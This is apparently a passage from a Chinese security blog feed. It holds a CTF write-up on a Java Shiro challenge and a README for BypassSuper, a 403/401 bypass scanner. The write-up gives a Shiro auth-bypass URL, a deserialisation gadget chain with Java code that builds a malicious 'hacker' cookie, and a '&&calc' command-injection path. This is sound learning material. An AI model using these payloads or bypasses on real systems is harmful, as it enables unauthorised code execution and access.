title="灰盒测试"></a>灰盒测试</h1><ul><li>根据获取的账号<code>admin</code>尝试爆破（无果）</li><li>sql注入再次尝试根据前面过滤掉参数进行bypass（无果），后期发现根本没有数据库链接操作，不可能存在sql注入。</li><li>根据获取的shiro版本可知，没有shiro反序列化漏洞但有权限绕过（成功）。</li></ul><p>&emsp;&emsp; 目前为止只能根据页面知道，该页面是一个<code>访问日志</code>展示页面。<br> <img src="https://img-blog.csdnimg.cn/20210104152919888.png" alt="在这里插入图片描述"></p><hr><h1 id="源码深度刨析"><a href="#源码深度刨析" class="headerlink" title="源码深度刨析"></a>源码深度刨析</h1><h2 id="深度分析"><a href="#深度分析" class="headerlink" title="深度分析"></a>深度分析</h2><p>&emsp;&emsp; Javaweb题目当然还是得从web页面分析，看源码分析一共就两个类访问控制器是处理web请求的。</p><ul><li><code>IndexController</code>处理登录前后页面</li><li><code>LoginController</code>处理登录请求页面<br>&emsp;&emsp; 前面分析到没有数据库，在源码也没发现登录的账号和密码故不用考虑 <code>LoginController</code>类，深度分析<code>IndexController</code>类发现该类存在反序列化操作。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(&#123;<span class="string">"/index/&#123;name&#125;"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response, @PathVariable String name)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line">        <span class="keyword">boolean</span> exist = <span class="keyword">false</span>;</span><br><span class="line">        Cookie cookie = <span class="keyword">null</span>;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Cookie[] var8 = cookies;</span><br><span class="line">            <span class="keyword">int</span> var9 = cookies.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var10 = <span class="number">0</span>; var10 &lt; var9; ++var10) &#123;</span><br><span class="line">                Cookie c = var8[var10];</span><br><span class="line">                <span class="comment">//判断cookie中是否存在hacker字段</span></span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">"hacker"</span>)) &#123;</span><br><span class="line">                    exist = <span class="keyword">true</span>;</span><br><span class="line">                    cookie = c;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 存在hacker字段，执行反序列化操作</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (exist) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.base64Decode(cookie.getValue());</span><br><span class="line">            <span class="comment">//反序列化操作点</span></span><br><span class="line">            user = (User)Tools.deserialize(bytes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 没有hacker字段，添加一个并设置其值</span></span><br><span class="line">            user = <span class="keyword">new</span> User();</span><br><span class="line">            user.setID(<span class="number">1</span>);</span><br><span class="line">            user.setUserName(name);</span><br><span class="line">            cookie = <span class="keyword">new</span> Cookie(<span class="string">"hacker"</span>, Tools.base64Encode(Tools.serialize(user)));</span><br><span class="line">            response.addCookie(cookie);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 添加值到前端页面</span></span><br><span class="line">        request.setAttribute(<span class="string">"hacker"</span>, user);</span><br><span class="line">        request.setAttribute(<span class="string">"logs"</span>, <span class="keyword">new</span> LogHandler());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>前端源码<br><img src="https://img-blog.csdnimg.cn/20210104152954385.png" alt="在这里插入图片描述"></li><li><code>存在反序列化点，下一步肯定构造反序列化请求，但如何构造反序列化请求呢？</code>前文提及到调用<code>exeCmd</code>方法只有<code>LogHandler</code>类。分析该类，两个方法都调用<code>exeCmd</code>执行命令。<code>invoke</code>方法里面调用的<code>exeCmd</code>是执行<code>wirteLog</code>命令，而<code>toString</code>方法里面调用<code>exeCmd</code>是执行<code>readLog</code>命令。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogHandler</span> <span class="keyword">extends</span> <span class="title">HashSet</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String readLog = <span class="string">"tail  accessLog.txt"</span>;</span><br><span class="line">    <span class="keyword">private</span> String writeLog = <span class="string">"echo /test &gt;&gt; accessLog.txt"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogHandler</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 请求url路径写入访问日志</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Tools.exeCmd(<span class="keyword">this</span>.writeLog.replaceAll(<span class="string">"/test"</span>, (String)args[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.target, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 读取日志返回结果</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Tools.exeCmd(<span class="keyword">this</span>.readLog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结下目前为止所有的信息点：</p><ol><li>存在权限绕过，URL：<code>index/%3b/admin</code>(/%3b可以是<code>/&#39;/</code>, <code>select</code>, <code>union</code>, <code>/;</code>之一)</li><li>存在反序列化点<code>IndexController#index</code>，构造请求<code>cookie</code>一定要有<code>hacker</code>字段。</li><li><code>index/admin</code>是访问日志</li><li>反序列化执行的点在<code>LogHandler</code>其中的两个方法</li></ol><hr><h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>下面两端代码分别是通过反射调用<code>invoke</code>和<code>toString</code>方法达到执行命令目的，对比一下很明显<code>toString</code>方法更加的简单质朴。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">    Field wirtelog = logHandler.getClass().getDeclaredField(<span class="string">"writeLog"</span>);</span><br><span class="line">    wirtelog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    wirtelog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">    Object ob = <span class="keyword">new</span> Object();</span><br><span class="line">    Method method = logHandler.getClass().getMethod("invoke", Object.class, Method.class, Object[].class);</span><br><span class="line">    Object[] obs = <span class="keyword">new</span> Object[]&#123;<span class="string">"asd"</span>,<span class="string">"asd"</span>&#125;;</span><br><span class="line">    logHandler.invoke(ob,method,obs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210104181755765.gif" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ToString</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">        Field readlog = logHandler.getClass().getDeclaredField(<span class="string">"readLog"</span>);</span><br><span class="line">        readlog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        readlog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">        logHandler.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210104181749788.gif" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 反序列化点get！反序列化目标get！最后一步构造反序列化链！现在缺少一个封装类将构造好的类封装发给服务器直接反序列化，<code>ysoserial</code>其中的CC5中使用的<code>BadAttributeValueExpException</code>异常类满足要求。最终Payload如下：</p><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">    Field readlog = logHandler.getClass().getDeclaredField(<span class="string">"readLog"</span>);</span><br><span class="line">    readlog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    readlog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">    Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    field.set(badAttributeValueExpException, logHandler);</span><br><span class="line">    String datas = Tools.base64Encode(Tools.serialize(badAttributeValueExpException));</span><br><span class="line">    System.out.println(<span class="string">"Cookie: "</span> + <span class="string">"hacker="</span>+ datas);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210104181738312.gif" alt="在这里插入图片描述"></p><hr><h2 id="非预期–执行命令"><a href="#非预期–执行命令" class="headerlink" title="非预期–执行命令"></a>非预期–执行命令</h2><p><strong>效果如下：访问/index/admin&amp;&amp;calc会执行命令</strong></p><p><img src="https://img-blog.csdnimg.cn/20210104202319514.gif" alt="在这里插入图片描述"></p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>&emsp;&emsp; 根本原因在下面这一段，作者没有考虑到用户会使用管道来执行命令，直接将url路径直接就写访问日志中，导致执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Tools.exeCmd(<span class="keyword">this</span>.writeLog.replaceAll(<span class="string">"/test"</span>, (String)args[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.target, args);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><p>&emsp;&emsp; 写到这，其实是对shiro一些知识的补充。前期对shiro了解较少，后期做了大量知识补充。官方给的是jar包，反编译之后改成自己的踩了 一些坑。顺便记录一下，只想看题目分析的可以Pass。</p><ol><li><p>下面是自己不仔细导致错误，其实都知道，但是忘记了</p><ul><li>User没有实现<code>Serializable接口</code>导致报错，不能反序列化</li><li>User类没有<code>serialVersionUID</code>导致报错，版本不一致</li></ul></li><li><p>Tools类没有判断操作系统的版本，导致执行命令不成功<br><img src="https://img-blog.csdnimg.cn/20210105161235551.png" alt="在这里插入图片描述"></p></li><li><p>tail命令在windows系统是没有的，导致无法生成acessLog.txt文件</p></li><li><p>tail加了-f参数导致服务器一直读取文件，导致长时间不回显</p></li><li><p>注释掉<code>MyFilter</code>中<code>Component</code>就是shiro原本的CVE-2020-13933漏洞<br><img src="https://img-blog.csdnimg.cn/20210105162144633.png" alt="在这里插入图片描述"></p></li><li><p>学习了b站关于shiro内容<a href="https://www.bilibili.com/video/BV1NE411i7S8" target="_blank" rel="noopener">【狂神说Java】SpringBoot整合Shiro框架</a></p></li></ol><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*              Gadget：</span><br><span class="line">*                  Tools.base64Decode()</span><br><span class="line">*                      Tools.deserialize()</span><br><span class="line">*                          ObjectInputStream.readObject()</span><br><span class="line">*                              BadAttributeValueExpException.readObject()</span><br><span class="line">*                                  LogHandler.toSting()</span><br><span class="line">*                                      Tools.exeCmd()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 当时写这个题目的时候已经无限接近答案了，只是当时不确定怎么封装类。不得不说CC链还是不熟悉，没有完全吃透，不得不说CC永远的神！</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a><br><a href="https://www.bilibili.com/video/BV1NE411i7S8" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1NE411i7S8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文章首发：&lt;a href=&quot;https://www.anquanke.com/post/id/231488&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化 Java shiro" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java-shiro/"/>
    
  </entry>
  
  <entry>
    <title>BypassSuper使用介绍说明</title>
    <link href="https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"/>
    <id>https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-02-05T00:22:16.000Z</published>
    <updated>2021-01-22T12:15:07.687Z</updated>
    
    <content type="html"><![CDATA[<h1 align="center">BypassSuper</h1><h3 align="center">一款针对403/401页面进行快速、高效尝试Bypass的扫描工具</h3> <p align="center">    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/python-3.X-blueviolet"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/Bypass-Super-green"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Forks" src="https://img.shields.io/github/forks/SummerSec/BypassSuper"></a>     <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Release" src="https://img.shields.io/github/release/SummerSec/BypassSuper.svg"></a>  <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Stars" src="https://img.shields.io/github/stars/SummerSec/BypassSuper.svg?style=social&label=Stars"></a>     <a href="https://github.com/SummerSec" target="_blank" rel="noopener"><img alt="Follower" src="https://img.shields.io/github/followers/SummerSec.svg?style=social&label=Follow"></a>    <a href="https://twitter.com/SecSummers" target="_blank" rel="noopener"><img alt="SecSummers" src="https://img.shields.io/twitter/follow/SecSummers.svg"></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" width="49.6"></rect></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" width="17.0" x="49.6"></rect></a>    </p><p><img src="https://visitor-badge.laobi.icu/badge?page_id=SummerSec.BypassSuper" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                ______                            _____</span><br><span class="line">                | ___ \                          &#x2F;  ___|</span><br><span class="line">                | |_&#x2F; &#x2F;_   _ _ __   __ _ ___ ___ \ &#96;--. _   _ _ __   ___ _ __</span><br><span class="line">                | ___ \ | | | &#39;_ \ &#x2F; _&#96; &#x2F; __&#x2F; __| &#96;--. \ | | | &#39;_ \ &#x2F; _ \ &#39;__|</span><br><span class="line">                | |_&#x2F; &#x2F; |_| | |_) | (_| \__ \__ \&#x2F;\__&#x2F; &#x2F; |_| | |_) |  __&#x2F; |</span><br><span class="line">                \____&#x2F; \__, | .__&#x2F; \__,_|___&#x2F;___&#x2F;\____&#x2F; \__,_| .__&#x2F; \___|_|</span><br><span class="line">                        __&#x2F; | |                              | |</span><br><span class="line">                       |___&#x2F;|_|                              |_|</span><br><span class="line">                    author: summersec</span><br><span class="line">                    version: 1.0</span><br><span class="line">                    Github: https:&#x2F;&#x2F;github.com&#x2F;SummerSec&#x2F;BypassSuper</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure><h2 id="👮🏻‍♀️-免责声明"><a href="#👮🏻‍♀️-免责声明" class="headerlink" title="👮🏻‍♀️ 免责声明"></a>👮🏻‍♀️ 免责声明</h2><p>&emsp;&emsp; 由于传播、利用BypassSuper工具（下简称本工具）提供的检测功能而造成的<strong>任何直接或者间接的后果及损失</strong>，均由使用者本人负责，开发者本人<strong>不为此承担任何责任</strong>。</p><p>&emsp;&emsp; 本工具会根据使用者检测结果<strong>自动生成</strong>扫描结果报告，本报告内容及其他衍生内容均<strong>不能代表</strong>本人的立场及观点。</p><p>&emsp;&emsp; 请在使用本工具时遵循使用者以及目标系统所在国当地的<strong>相关法律法规</strong>，一切<strong>未授权测试均是不被允许的</strong>。若出现相关违法行为，我们将<strong>保留追究</strong>您法律责任的权利，并<strong>全力配合</strong>相关机构展开调查。</p><h2 id="dragon-来龙去脉"><a href="#dragon-来龙去脉" class="headerlink" title=":dragon:来龙去脉"></a>:dragon:来龙去脉</h2><p>&emsp;&emsp; 在某群里看到大佬发了个这个项目<a href="https://github.com/sting8k/BurpSuite_403Bypasser" target="_blank" rel="noopener">BurpSuite_403Bypasser</a>，然后看了一眼这个具体实现功能。因为在此之前在推特上看到国际友人发过类似的tips，当时就挺感兴趣的。但找了一圈并没有发现有什么现成的扫描器或者burp插件，当时是不了了之。这个项目发现之后，我第一时间就去看了一眼源代码，输出日志，发生很多payload和内容开发者是理解错的，或者是姿势不对。当然我发现之后，我开始动手在此源码上开始我的修改之路。截至本文发布时间为止，也有人发现这个问题，详情参考：<a href="https://github.com/sting8k/BurpSuite_403Bypasser/issues/4" target="_blank" rel="noopener">https://github.com/sting8k/BurpSuite_403Bypasser/issues/4</a></p><hr><h2 id="zap-Installation"><a href="#zap-Installation" class="headerlink" title=":zap: Installation"></a>:zap: Installation</h2><h3 id="BypassSuper-Burp"><a href="#BypassSuper-Burp" class="headerlink" title="BypassSuper-Burp"></a>BypassSuper-Burp</h3><p>&emsp;&emsp; <code>BurpSuite -&gt; Extender -&gt; Extensions -&gt; Add -&gt; Extension Type: Python -&gt; Select file: BypassSuper-Burp.py -&gt; Next till Fininsh</code></p><hr><h3 id="BypassSuper"><a href="#BypassSuper" class="headerlink" title="BypassSuper"></a>BypassSuper</h3><p>&emsp;&emsp; <code>pip3 install -r requirements.txt  --&gt; python3 BypassSuper.py -h</code></p><hr><h2 id="clap-参数介绍"><a href="#clap-参数介绍" class="headerlink" title=":clap: 参数介绍"></a>:clap: 参数介绍</h2><p>&emsp;&emsp; 您可以使用<code>python3 BypassSuper.py [options]</code>命令来运行本工具，<code>options</code>内容表述如下：</p><ul><li><p>-h（–help）</p><p>帮助命令，无需附加参数，查看本工具支持的全部参数及其对应简介；</p></li><li><p>-u （–url）<br>要扫描的网站网址路径，为必填选项之一，例如：<code>-u https://www.baidu.com</code>；</p><ul><li>-f （–file）<br>要扫描的网站网址路径文件，为必填选项之一，例如：<code>-f target.txt</code>；</li><li>-t （–threads）<br>扫描线程数量，为选填选项，配合-f参数使用，要求必须<code>target数量大于线程数量（默认20）</code>不然无法执行，例如：<code>-f target.txt -t 20</code></li></ul></li></ul><hr><h2 id="clapper-Screenshot"><a href="#clapper-Screenshot" class="headerlink" title=":clapper:Screenshot"></a>:clapper:Screenshot</h2><p><img src="https://img-blog.csdnimg.cn/20201207095047803.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 安装完成后自动扫描，在两个地方可以查看到扫描结果。第一个：在target里面，设置过滤器全部显示或者显示4xx。<br><img src="https://img-blog.csdnimg.cn/20201206225513435.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201207094215278.png" alt="两个"></p><p>&emsp;&emsp;  第二个地方在仪表盘<br><img src="https://img-blog.csdnimg.cn/20201207094338881.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 在插件拓展里面可以的UI可以查看扫描过程（建议直接输出到文件方便查看，UI里面只能查看部分，会被覆盖）。<br><img src="https://img-blog.csdnimg.cn/20201207094526995.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201207095902133.png" alt="在这里插入图片描述"></p><hr><h2 id="clapper-实际案例"><a href="#clapper-实际案例" class="headerlink" title=":clapper:实际案例"></a>:clapper:实际案例</h2><p>&emsp;&emsp; 靶场案例<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented" target="_blank" rel="noopener">URL-based access control can be circumvented</a>，这个是portswigger官方给的实际案例。<del>悄咪咪说一句，上面给的截屏是一个真实SRC案例！</del><br>实用burp插件效果<br><img src="https://img-blog.csdnimg.cn/20210122195343459.png" alt="在这里插入图片描述"></p><p>使用BypassSuper脚本效果<br><img src="https://img-blog.csdnimg.cn/20210122201042177.png" alt="在这里插入图片描述"></p><hr><h2 id="memo-TODO"><a href="#memo-TODO" class="headerlink" title=":memo: TODO"></a>:memo: TODO</h2><ul><li><input disabled type="checkbox"> 添加参数Bypass规则</li><li><input disabled type="checkbox"> 重构代码，目前所有源码都在一个文件中，太杂了</li><li><input disabled type="checkbox"> 自动扫描网页中的api接口实现BypassSuper中的“JSFinder”</li><li><input disabled type="checkbox"> 目录爆破，配合JSFinder</li><li><input disabled type="checkbox"> 自动爬取网页实现爬虫功能发现更多页面和接口</li></ul><hr><h2 id="📝-意见交流"><a href="#📝-意见交流" class="headerlink" title="📝 意见交流"></a>📝 意见交流</h2><hr><p>&emsp;&emsp; 您可以直接在GIthub仓库中提交ISSUE：<a href="https://github.com/SummerSec/BypassSuper/issues" target="_blank" rel="noopener">https://github.com/SummerSec/BypassSuper</a>亦或者发送邮件到summersec[@]qq.com</p><h2 id="hotsprings-已知问题"><a href="#hotsprings-已知问题" class="headerlink" title=":hotsprings:已知问题"></a>:hotsprings:已知问题</h2><ul><li><a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">Exception: local variable ‘req’ referenced before assignment此问题是主机设置全局代理问题，目前没有添加代理功能。</a> 解决办法：<a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">关闭全局代理</a><br><img src="https://img-blog.csdnimg.cn/20201207100058886.png" alt></li><li><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">结果csv文件中文乱码并且格式不对。</a><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">解决办法</a></li></ul><hr><h2 id="book-References"><a href="#book-References" class="headerlink" title=":book: References"></a>:book: References</h2><ul><li><p><a href="https://twitter.com/iam_j0ker/status/1324354024657711106?s=20" target="_blank" rel="noopener">https://twitter.com/iam_j0ker/status/1324354024657711106?s=20</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1297556269960540161?s=20" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1297556269960540161?s=20</a></p></li><li><p><a href="https://twitter.com/SalahHasoneh1/status/1296572143141031945" target="_blank" rel="noopener">https://twitter.com/SalahHasoneh1/status/1296572143141031945</a></p></li><li><p><a href="https://twitter.com/infosecsanyam/status/1331146922011324417" target="_blank" rel="noopener">https://twitter.com/infosecsanyam/status/1331146922011324417</a></p></li><li><p><a href="https://twitter.com/i_hack_everyone/status/1332027600726753280" target="_blank" rel="noopener">https://twitter.com/i_hack_everyone/status/1332027600726753280</a></p></li><li><p><a href="https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70" target="_blank" rel="noopener">https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1333811754745249792" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1333811754745249792</a></p></li><li><p><a href="https://twitter.com/h4x0r_dz/status/1317218511937261570" target="_blank" rel="noopener">https://twitter.com/h4x0r_dz/status/1317218511937261570</a></p></li><li><p><a href="https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md" target="_blank" rel="noopener">https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md</a></p></li></ul><hr><p> <a href="https://starchart.cc/SummerSec/BypassSuper" target="_blank" rel="noopener"><img src="https://starchart.cc/SummerSec/BypassSuper.svg" alt="Stargazers over time"></a> </p><img align="right" src="https://profile-counter.glitch.me/summersec/count.svg" width="200">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 align=&quot;center&quot;&gt;BypassSuper&lt;/h1&gt;
&lt;h3 align=&quot;center&quot;&gt;一款针对403/401页面进行快速、高效尝试Bypass的扫描工具&lt;/h3&gt;
 &lt;p align=&quot;center&quot;&gt;
    &lt;a href=&quot;https://githu
      
    
    </summary>
    
    
      <category term="工具" scheme="https://summersec.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="未授权 401 403" scheme="https://summersec.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83-401-403/"/>
    
  </entry>
  
  <entry>
    <title>一次意外的代码审计----JfinalCMS审计</title>
